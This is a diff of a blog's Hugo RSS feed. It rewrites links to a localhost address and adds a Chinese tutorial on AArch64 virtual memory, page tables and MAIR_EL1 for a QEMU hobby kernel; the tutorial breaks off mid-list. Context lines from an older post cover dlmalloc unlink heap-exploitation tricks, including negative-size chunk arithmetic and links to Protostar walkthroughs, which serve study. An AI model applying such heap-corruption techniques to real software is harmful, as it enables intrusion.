@@ -2,17 +2,17 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>Binary on Senri&#39;s Memos</title>
-        <link>/categories/binary/</link>
+        <link>//localhost:1313/categories/binary/</link>
         <description>Recent content in Binary on Senri&#39;s Memos</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
-        <lastBuildDate>Mon, 30 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="/categories/binary/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 14 Nov 2026 00:00:00 +0000</lastBuildDate><atom:link href="//localhost:1313/categories/binary/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>Old Dlmalloc Unlink Tricks -REMASTERED-</title>
-        <link>/p/old_dlmalloc_unlink_tricks/</link>
+        <link>//localhost:1313/p/old_dlmalloc_unlink_tricks/</link>
         <pubDate>Sun, 24 Apr 2022 00:00:00 +0000</pubDate>
         
-        <guid>/p/old_dlmalloc_unlink_tricks/</guid>
-        <description>&lt;img src="/p/old_dlmalloc_unlink_tricks/cover.png" alt="Featured image of post Old Dlmalloc Unlink Tricks -REMASTERED-" /&gt;&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
+        <guid>//localhost:1313/p/old_dlmalloc_unlink_tricks/</guid>
+        <description>&lt;img src="//localhost:1313/p/old_dlmalloc_unlink_tricks/cover.png" alt="Featured image of post Old Dlmalloc Unlink Tricks -REMASTERED-" /&gt;&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://research.cs.wisc.edu/sonar/projects/mnemosyne/resources/doc/html/malloc-original_2src_2dlmalloc_8c-source.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;☞ usermode/library/malloc-original/src/dlmalloc.c&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://phrack.org/issues/57/9.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
@@ -391,10 +391,10 @@ data, etc to &lt;a class=&#34;link&#34; href=&#34;mailto:dl@cs.oswego.edu&#34; &
 &lt;p&gt;&lt;em&gt;nextchunk = p + size = p + -8 = p - 8&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;prevchunk = p - prev_size = p - -8 = p + 8&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;变成以下的效果：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/old_dlmalloc_unlink_tricks/nagative_size.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/old_dlmalloc_unlink_tricks/nagative_size.png&#34;
 	width=&#34;2324&#34;
 	height=&#34;1290&#34;
-	srcset=&#34;/p/old_dlmalloc_unlink_tricks/nagative_size_hu507ad38ef06aa99c1060308c140897fe_358203_480x0_resize_box_3.png 480w, /p/old_dlmalloc_unlink_tricks/nagative_size_hu507ad38ef06aa99c1060308c140897fe_358203_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/old_dlmalloc_unlink_tricks/nagative_size_hu507ad38ef06aa99c1060308c140897fe_358203_480x0_resize_box_3.png 480w, //localhost:1313/p/old_dlmalloc_unlink_tricks/nagative_size_hu507ad38ef06aa99c1060308c140897fe_358203_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;nagative_size.png&#34;
@@ -431,9 +431,9 @@ data, etc to &lt;a class=&#34;link&#34; href=&#34;mailto:dl@cs.oswego.edu&#34; &
 &lt;h2 id=&#34;proof-of-concept&#34;&gt;Proof of Concept&lt;/h2&gt;
 &lt;p&gt;本来想自己写例子的，但想想 Protostar 已经提供了那么好的题目那就用他们的吧x&lt;/p&gt;
 &lt;h3 id=&#34;unlink-previous&#34;&gt;Unlink previous&lt;/h3&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;/p/protostar_heap_3&#34; &gt;Protostar Heap Three Walkthrough&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/protostar_heap_3&#34; &gt;Protostar Heap Three Walkthrough&lt;/a&gt;&lt;/p&gt;
 &lt;h3 id=&#34;unlink-next&#34;&gt;Unlink next&lt;/h3&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;/p/protostar_final_2&#34; &gt;Protostar Final Two Walkthrough&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/protostar_final_2&#34; &gt;Protostar Final Two Walkthrough&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id=&#34;appendix&#34;&gt;Appendix&lt;/h2&gt;
 &lt;h3 id=&#34;source-code-of-free&#34;&gt;Source code of free()&lt;/h3&gt;
 &lt;details&gt;
@@ -610,12 +610,976 @@ data, etc to &lt;a class=&#34;link&#34; href=&#34;mailto:dl@cs.oswego.edu&#34; &
 </description>
         </item>
         <item>
+        <title>AArch64 虚拟内存速成</title>
+        <link>//localhost:1313/p/aarch64-va/</link>
+        <pubDate>Sat, 14 Nov 2026 00:00:00 +0000</pubDate>
+        
+        <guid>//localhost:1313/p/aarch64-va/</guid>
+        <description>&lt;img src="//localhost:1313/p/aarch64-va/index.png" alt="Featured image of post AArch64 虚拟内存速成" /&gt;&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
+&lt;p&gt;起点在我的 &lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/lumos&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Final Year Project&lt;/a&gt; 的提交 &lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/lumos/commit/63c50b700df936b6ce6f30ad30bdda886c023780&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;63c50b7 Add periodic timer interrupt and tick counting&lt;/a&gt;。本文修改后的代码库在提交 &lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/lumos/commit/5ba8cf4fe732b03fe9835204d33eba3a3182269f&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;5ba8cf4 Enable the MMU with a static level 1 translation table&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;本项目基于 QEMU virt 平台，使用 Cortex-A57 CPU 模型。现在项目已经能做到：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;打印当前异常等级（EL1，这相当于 x86-64 的 Ring 0，属于操作系统内核级别的权限）&lt;/li&gt;
+&lt;li&gt;使用 PL011 串口（以下简称 UART），响应 UART 接收中断并回显收到的字符&lt;/li&gt;
+&lt;li&gt;使用 ARM Generic Timer（EL1 物理定时器）每秒触发一次中断，并在中断中打印 &lt;code&gt;tick: N&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;在阅读完本篇文章，理解相关概念并加入所有功能后，os 将能做到：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;造出一张 AArch64 页表&lt;/li&gt;
+&lt;li&gt;逐位检查描述符&lt;/li&gt;
+&lt;li&gt;打开 MMU，并证明系统仍然正常&lt;/li&gt;
+&lt;li&gt;故意访问一块未映射的内存，检查异常向量&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;如果要尝试运行代码，你需要先修改 Makefile 指定编译器，链接器和模拟器的路径，然后：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;make
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;make run
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此时 QEMU 会在前台运行。按 &lt;code&gt;Ctrl-A&lt;/code&gt; 松开后再按 &lt;code&gt;X&lt;/code&gt; 就可以退出。&lt;/p&gt;
+&lt;h2 id=&#34;基本概念&#34;&gt;基本概念&lt;/h2&gt;
+&lt;h3 id=&#34;虚拟地址和物理地址&#34;&gt;虚拟地址和物理地址&lt;/h3&gt;
+&lt;p&gt;目前的 UART 代码有这样的片段：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// drivers/uart/uart.c
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define UART_BASE 0x09000000UL
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define UART_DR (*(volatile uint32_t *)(UART_BASE + 0x00))
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;CPU 执行 &lt;code&gt;str w0, [x1]&lt;/code&gt; 时，&lt;code&gt;x1&lt;/code&gt; 里是 &lt;code&gt;0x0900_0000&lt;/code&gt;。CPU 并不知道这是 UART，它只是把这个数字交给地址总线。这个数字的具体含义取决于 Memory Management Unit（MMU）：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;MMU off: CPU -- 0x09000000 --&amp;gt; Memory / Device
+
+MMU on: CPU -- 0x09000000 --&amp;gt; [MMU] --&amp;gt; table walk --&amp;gt; another number --&amp;gt; Memory / Device
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在这里，&lt;code&gt;0x0900_0000&lt;/code&gt; 是由程序（包括内核）所发出的&lt;strong&gt;虚拟地址（VA）&lt;/strong&gt;，而 another number 才是查表后真正送到内存控制器的&lt;strong&gt;物理地址（PA）&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;在之前的实现中，直接写 &lt;code&gt;0x0900_0000&lt;/code&gt; 就碰到 UART，是因为这个常量恰好等于QEMU virt 这块虚拟板分配给 PL011 串口（UART）的物理地址。这是完全的硬编码，只要换到另一个平台，这个地址便会失效。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;在 MMU 关着的时候，没有任何机制替代码纠正这个数字&lt;/strong&gt;。这正是虚拟内存要解决的问题之一：有了页表，驱动可以统一使用一个固定的虚拟地址，由页表把它映射到「这块板子实际上 UART 的地址」。之后换板子只需要修改页表，而不用再重写驱动。&lt;/p&gt;
+&lt;h3 id=&#34;mmumemory-management-unit&#34;&gt;MMU（Memory Management Unit）&lt;/h3&gt;
+&lt;p&gt;MMU 要做的便是：&lt;strong&gt;拿到 VA，查一张表，得到 PA，顺便检查权限。&lt;/strong&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;VA --&amp;gt; [table walk] --&amp;gt; PA + permissions
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这张表就是&lt;strong&gt;页表&lt;/strong&gt;。它不是硬件，而是要之后手动往内存里写的一段数字。&lt;/p&gt;
+&lt;p&gt;如果查表过程中发现这张表里没有 VA 对应的 PA，MMU 就会报 translation fault 异常。如果找到了对应的表项，但表项里的权限不允许这次访问（比如往只读页写数据），MMU 就会报 permission fault 异常。&lt;/p&gt;
+&lt;h3 id=&#34;页&#34;&gt;页&lt;/h3&gt;
+&lt;p&gt;AArch64 的地址是一个 64 位整数，存在 64 位的通用寄存器里。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;uint64_t&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;p;	&lt;span style=&#34;color:#75715e&#34;&gt;// p 变量本身占 8 字节
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;							&lt;span style=&#34;color:#75715e&#34;&gt;// p 里面装的是一个 64 位的地址值，也是 8 字节
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;AArch64 是字节寻址，每个字节都拥有一个唯一地址。但如果一个字节就对应保存一条翻译记录，那么只是表就要几个 GB。所以硬件按固定大小的块翻译。&lt;/p&gt;
+&lt;p&gt;AArch64 支持 4 KB，16 KB，64 KB 三种粒度，其中 4 KB 是最小也是最常用的。在 4 KB 粒度下，每页的长度是 2^12 = 4096 字节，即可以包含 4096 （或者 &lt;code&gt;0x1000&lt;/code&gt;）个地址。&lt;/p&gt;
+&lt;h4 id=&#34;虚拟地址的组成&#34;&gt;虚拟地址的组成&lt;/h4&gt;
+&lt;p&gt;把地址想成「第几页」+「这一页里的第几个字节」：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;虚拟地址 = 页号（参与翻译） + 页内偏移（不翻译）
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;例如，页号从 0 开始：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;0x0000_0000&lt;/code&gt;-&lt;code&gt;0x0000_0FFF&lt;/code&gt; 属于第 0 页&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;0x0000_1000&lt;/code&gt; 属于第 1 页，页内偏移是 &lt;code&gt;0x000&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;0x0000_1001&lt;/code&gt; 仍在第 1 页，页内偏移是 &lt;code&gt;0x001&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;用一个更像现实里的地址来看的话：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0x0900_0000 -&amp;gt; 页号 0x09000 + 偏移 0x000
+0x0900_0123 -&amp;gt; 页号 0x09000 + 偏移 0x123
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;具体算法如下：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;页号 = 地址 &amp;gt;&amp;gt; 12（也就是 地址 / 0x1000）
+偏移 = 地址 &amp;amp; 0xFFF（也就是 地址 % 0x1000）
+页基址 = 地址 &amp;amp; ~0xFFF（清掉低 12 位，得到这一页的开头）
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;偏移范围&#34;&gt;偏移范围&lt;/h4&gt;
+&lt;p&gt;低 12 位能表示 &lt;code&gt;2^12 = 4096&lt;/code&gt; 个值，&lt;strong&gt;所以 4 KB 粒度下，页内偏移只能是 &lt;code&gt;0x000&lt;/code&gt; 到 &lt;code&gt;0xFFF&lt;/code&gt;&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;偏移加到 &lt;code&gt;0xFFF&lt;/code&gt; 就已经是这一页的最后一个字节，再加 1 就进位到下一页：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0x0900_0FFC
+0x0900_0FFD
+0x0900_0FFE
+0x0900_0FFF &amp;lt;- 这一页的最后一个字节
+0x0900_1000 &amp;lt;- 下一页的第一个字节，偏移回到 0x000
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这也是为什么页的起始地址在十六进制里总是末尾三个 0，因为它们是 4 KB 对其的。&lt;/p&gt;
+&lt;p&gt;页表的粒度是 4 KB，它只知道「这一页整体在哪」，不区分页内的第几个字节。所以：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;翻译只替换页号&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;页内偏移原样带到物理地址&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;VA 0x0900_0123 -&amp;gt; 页号 0x09000 翻译成物理页号 0x09000
+               -&amp;gt; 偏移 0x123 原样保留
+               -&amp;gt; 得到 PA 0x0900_0123
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;页内第 &lt;code&gt;0x123&lt;/code&gt; 个字节，翻译后还是目标页的第 &lt;code&gt;0x123&lt;/code&gt; 个字节。这就是「页内连续」的含义。&lt;/p&gt;
+&lt;h4 id=&#34;多级页表&#34;&gt;多级页表&lt;/h4&gt;
+&lt;p&gt;目前的代码配置是 39 位 VA（这是在后面的 &lt;code&gt;TCR_EL1&lt;/code&gt; 节选出来的值，这里请先当成已知参数），而 4 KB 粒度下偏移就要占 12 位（还记得之前说的 2^12 = 4096 么），那么剩下给页号可以使用的位数是 39 - 12 = 27 位。&lt;/p&gt;
+&lt;p&gt;但如果直接用 27 位页号做索引，页表需要 2^27 项，每项 8 字节，共 1 GB，且每个地址空间都要一份，而其中大部分项还是空的。因此，AArch64 采用&lt;strong&gt;多级页表&lt;/strong&gt;。让着 27 位切分成 9 + 9 + 9，对应 L1，L2，L3 三级。上级无效时可以不分配下级，这样只需要为实际用到的地址区域付出内存。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;VA[38:12] 为 27 位页号，其中
+- VA[38:30] L1 索引
+- VA[29:21] L2 索引
+- VA[20:12] L3 索引
+
+VA[11:0] 的 12 位偏移，不参与页表翻译
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;对 &lt;code&gt;0x0900_0000&lt;/code&gt;：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;VA[38:30] = 0       -&amp;gt; 查 l1_table[0]
+VA[29:21] = 0x48    -&amp;gt; 查 l2_table[0x48]    （l2_table 是 l1_table[0] 指向的那张 L2 表）
+VA[20:12] = 0x000   -&amp;gt; 查 l3_table[0]       （l3_table 是 l2_table[0x48] 指向的那张 L3 表）
+VA[11:0]  = 0x000   -&amp;gt; 偏移
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而这里的 9 位也不是随便选的：一张页表是包含了许多描述符（下一章节）的数组，每个描述符 8 字节，一张表有 2^9 = 512 项，共 512 × 8 = 4096 字节，刚好是一页。&lt;/p&gt;
+&lt;p&gt;也就是说，索引位数是被「一张表恰好占一页」反推出来的：页大小 4 KB / 描述符 8 字节 = 512 项，512 项需要 9 位来索引。&lt;/p&gt;
+&lt;p&gt;这样设计有两个好处：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;一张表正好占一个物理页，可以直接用分配物理页的方式分配页表&lt;/li&gt;
+&lt;li&gt;页表本身也 4 KB 对齐，物理基址的低 12 位必然是 0，这样描述符里就不用存这 12 位，可以留出来放权限和属性（见下一节）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;描述符&#34;&gt;描述符&lt;/h3&gt;
+&lt;p&gt;页表是一个数组，其中每个元素叫&lt;strong&gt;描述符（descriptor）&lt;/strong&gt;，8 字节。&lt;/p&gt;
+&lt;p&gt;一个描述符主要包含四类信息：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;访问权限：读写与执行权限，以及 EL0（用户态）是否有权访问&lt;/li&gt;
+&lt;li&gt;内存属性：这块内存是普通内存还是设备寄存器。设备寄存器的读写不能被缓存或重排，否则外设行为会出错（例如前面用到的 &lt;code&gt;0x0900_0000&lt;/code&gt; UART 就是设备内存）&lt;/li&gt;
+&lt;li&gt;地址：指向下一级表的物理基址。如果是最后一级（L3 页描述符，或 L1/L2 的块描述符），则是最终物理页（块）的物理基址&lt;/li&gt;
+&lt;li&gt;有效位与类型：这条描述符是否有效，以及它的指向的&lt;strong&gt;类型&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这里的重点便是类型，有三种：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;table（表描述符）：这条描述符指向下一级页表，翻译还没结束，要继续往下查。出现在 L0（如果配置有），L1，L2。本项目从 L1 开始所以只涉及 L1，L2&lt;/li&gt;
+&lt;li&gt;page（页描述符）：这条描述符直接指向一个 4 KB 物理页，翻译到此结束。只出现在 L3&lt;/li&gt;
+&lt;li&gt;block（块描述符）：这条描述符直接指向一大块物理内存，翻译到此结束，不再往下查。出现在 L1，L2&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;块描述符是 AArch64 的一个优化：如果一大块连续的虚拟地址都映射到连续的物理地址，而且权限和属性都一样，就可以用一条描述符覆盖整块，而不必为每个 4 KB 页都分配一个 L3 描述符。&lt;/p&gt;
+&lt;p&gt;而在我们这个为了方便理解而尽量少写代码的项目里，我们也可以利用它：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;只有 L1 页表&lt;/li&gt;
+&lt;li&gt;L1 页表只包含两个块描述符&lt;/li&gt;
+&lt;li&gt;第一个覆盖设备区，第二个覆盖 RAM 区&lt;/li&gt;
+&lt;li&gt;这样就不需要 L2，L3 页表了，虽然代价是一个描述符就覆盖了 1 GB 的虚拟地址空间，而这个空间里不一定真的有 RAM&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;p&gt;愉快的概念部分结束了，接下来是充满了记不住名字的字段和寄存器的地狱。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;第一步构建-l1-页表&#34;&gt;第一步：构建 L1 页表&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;目标&lt;/strong&gt;：在内存中准备好 L1 表并把打印出来，先不开启 MMU。&lt;/p&gt;
+&lt;p&gt;首先是新建 &lt;code&gt;mm/mmu.h&lt;/code&gt;，放了个函数声明 &lt;code&gt;mmu_build_tables()&lt;/code&gt; 和 &lt;code&gt;mmu_dump_tables()&lt;/code&gt;，然后是 &lt;code&gt;mm/mmu.c&lt;/code&gt;，这是接下来定义表的地方。&lt;/p&gt;
+&lt;h3 id=&#34;表本体定义&#34;&gt;表本体定义&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;uint64_t&lt;/span&gt; l1_table[&lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt;] &lt;span style=&#34;color:#a6e22e&#34;&gt;__attribute__&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;aligned&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;)));
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;定义一个 512 条 8 字节描述符的数组（4 KB）。唯一要注意的是 &lt;code&gt;aligned(4096)&lt;/code&gt; 因为表基址低 12 位必须是 0。&lt;/p&gt;
+&lt;h3 id=&#34;描述符的字段结构&#34;&gt;描述符的字段结构&lt;/h3&gt;
+&lt;h4 id=&#34;10-type描述符类型&#34;&gt;&lt;code&gt;[1:0]&lt;/code&gt; Type：描述符类型&lt;/h4&gt;
+&lt;p&gt;在值为 &lt;code&gt;00&lt;/code&gt; 时，标识当前描述符无效，此时不会继续翻译而是直接 fault。&lt;/p&gt;
+&lt;p&gt;而对于 &lt;code&gt;01&lt;/code&gt; 和 &lt;code&gt;11&lt;/code&gt; 则随着不同层级有不同含义：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;层级（本文的 4 KB 配置）&lt;/th&gt;
+&lt;th&gt;&lt;code&gt;01&lt;/code&gt;&lt;/th&gt;
+&lt;th&gt;&lt;code&gt;11&lt;/code&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;L0&lt;/td&gt;
+&lt;td&gt;不允许作为块描述符&lt;/td&gt;
+&lt;td&gt;Table&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;L1，L2&lt;/td&gt;
+&lt;td&gt;Block&lt;/td&gt;
+&lt;td&gt;Table&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;L3&lt;/td&gt;
+&lt;td&gt;无效&lt;/td&gt;
+&lt;td&gt;Page&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;由于是放在 &lt;code&gt;.bss&lt;/code&gt; 段，而在启动时 &lt;code&gt;.bss&lt;/code&gt; 已经清零了，所以没写的条目就是零既无效，所以不需要初始化。&lt;/p&gt;
+&lt;p&gt;本章节需要两条都是 L1 的 &lt;code&gt;01&lt;/code&gt;（块），所以翻译在 L1 就结束，不需要 L2，L3。&lt;/p&gt;
+&lt;h4 id=&#34;42-attrindx内存类型&#34;&gt;&lt;code&gt;[4:2]&lt;/code&gt; AttrIndx：内存类型&lt;/h4&gt;
+&lt;p&gt;由于 AttrIndex 只有 3 位，最多 8 个编号。但内存类型的组合远多于 8 种。于是架构设计成两层间接：AttrIndex 的三位只存一个属性索引，真正的属性定义放在 &lt;code&gt;MAIR_EL1&lt;/code&gt; （Memory Attribute Indirection Register (EL1)）寄存器中。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;MAIR_EL1&lt;/code&gt; 是一个 64 位的寄存器，被划分为了 8 个 8 位的字段 Attr0 - Attr7，每个字段定义一种内存属性。&lt;strong&gt;这八个槽位本身没有固定含义&lt;/strong&gt;，每个槽位的内容可以自己定义。&lt;/p&gt;
+&lt;p&gt;每个槽 8 位被拆分成了两部分：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;当 &lt;code&gt;[7:4]&lt;/code&gt; = &lt;code&gt;0000&lt;/code&gt; 时，表示 Device 内存，低四位用来选择设备内存的具体类型。本文使用整个字节 0x00，表示 Device-nGnRnE，即不合并访问，不重排访问，不提前确认写入完成&lt;/li&gt;
+&lt;li&gt;其余情况，&lt;code&gt;[7:4]&lt;/code&gt; 指定 Outer 缓存属性，&lt;code&gt;[3:0]&lt;/code&gt; 指定 Inner 缓存属性&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Normal 是普通内存类型，主要用于 RAM 中的代码和数据。它允许硬件采用缓存，推测访问等机制，但也可以配置为不可缓存。Inner 和 Outer 则用来分别指定内存系统内（离 CPU 核近的那几级，通常是 L1，也常包括 L2）外（更靠外的缓存，通常是 L3 或系统级缓存）层的缓存策略。&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;值&lt;/th&gt;
+&lt;th&gt;含义&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;0100&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Normal，不可缓存&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;1010&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Normal，写通（Write-Through）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;1110&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Normal，写回（Write-Back），不写分配&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;1111&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Normal，写回 + 写分配&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;其中：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;写通（Write-Through）：写数据时，同时写入缓存和主内存&lt;/li&gt;
+&lt;li&gt;写回（Write-Back）：写数据时，只写缓存，把这行标记为脏。等这行缓存被淘汰时才把脏数据一次性写回内存&lt;/li&gt;
+&lt;li&gt;写分配（Write-Allocate）：先把这一行从内存读进缓存，再在缓存里改。后面如果还要读写这块数据就能会命中&lt;/li&gt;
+&lt;li&gt;不写分配（No-Write-Allocate）：不读进缓存，直接把数据写到内存。适合写一次就不再用的数据，避免污染缓存&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;不需要记住那么多，因为本项目只会定义两个槽：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;槽 0 = &lt;code&gt;0xFF&lt;/code&gt; 即 Normal WB+WA，RAM 用&lt;/li&gt;
+&lt;li&gt;槽 1 = &lt;code&gt;0x00&lt;/code&gt; 即 Device-nGnRnE 设备用&lt;/li&gt;
